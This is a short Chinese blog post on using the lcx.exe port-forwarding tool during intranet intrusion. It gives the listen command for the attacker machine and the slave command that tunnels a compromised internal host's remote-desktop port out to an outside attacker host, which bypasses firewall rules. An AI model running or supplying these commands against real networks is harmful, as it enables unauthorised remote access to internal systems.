---
layout: post
title: 使用lcx命令进行内端口转发
date: 2018-8-08
categories: blog
tags: [lcx,端口转发,入侵内网]
description: 。
---

# 概述
当局域网中的某台计算机仅仅开放了web服务，该服务仅能供内网用户访问，外网用户根本没法直接访问（防火墙规则限制等原因），我们使用lcx命令将想要访问的服务端口转发出来绕过限制，这在内网入侵的是够经常用到，特别是远程登录服务时

# lcx介绍
lcx.exe是一个端口转发工具，相当于把目标服务器A上的3389端口转发到具有外网IP地址的B机器上，这样链接B机的3389端口相当于链接A机的3389端口，lcx多用于计算机处于内网的情况下，虽然计算机可能中了木马，可以进行控制。但是远没有直接登录到3389远程到桌面来的方便

# 使用方法
## 1 确定被控制计算机的IP地址
ipconfig /all 查看网络配置情况

## 2 在攻击机上起监听端口
`lcx -listen 51 3389`此处的51端口是靶机上转发过来的，3389是攻击机直接要访问的端口，这块的目的是一些客户端程序中已经设定好默认端口号，比如远程桌面软件默认链接3389端口，链接时直接映射到51端口上就可以直接访问

## 3 在靶机上进行端口转发
因为靶机上直接访问的端口受限，故要将端口转发到其他可访问的远程端口上（前提是一定要与外网连通）
`lcx -slave 远程IP 远程端口 本地IP 本地端口`

## 4 攻击机进行连接
攻击机直接打开远程桌面进行连接，或者浏览器访问固定端口


